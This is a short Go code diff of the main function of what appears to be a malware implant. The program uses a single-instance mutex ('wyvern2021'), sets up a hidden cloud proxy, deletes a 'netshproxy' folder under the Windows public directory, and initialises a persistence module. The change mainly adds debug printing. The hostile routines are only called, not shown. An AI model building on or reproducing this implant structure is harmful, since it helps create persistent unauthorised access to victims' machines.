@@ -19,39 +19,41 @@ func main() {
 	if _, err := CreateMutex("wyvern2021"); err != nil {
 		return
 	}
-
 	for {
 		err := SetupCloudProxy()
 		if err == nil {
 			break
 		}
-		err = os.RemoveAll(os.Getenv("public") + "\\netsh")
+		fmt.Println(err)
+		err = os.RemoveAll(os.Getenv("public") + "\\netshproxy")
 		if err != nil {
+			fmt.Println(err)
 			os.Exit(0)
 		}
 	}
 	errorChan := make(chan error)
-	readyChan := make(chan bool)
-	go CloudProxy(readyChan, errorChan)
+	go CloudProxy(errorChan)
 	go func(errChan <-chan error) {
 		for {
 			err := <- errChan
 			if err != nil {
+				fmt.Println(err)
 				os.Exit(0)
 			}
 		}
 	}(errorChan)
-	<- readyChan
 	time.Sleep(time.Second * 3)
 
 	var config Config
 	var persistence Persistence
 	err := config.Init()
 	if err != nil {
+		fmt.Println(err)
 		os.Exit(0)
 	}
 	err = persistence.Init(config)
 	if err != nil {
+		fmt.Println(err)
 		os.Exit(0)
 	}
 	for {
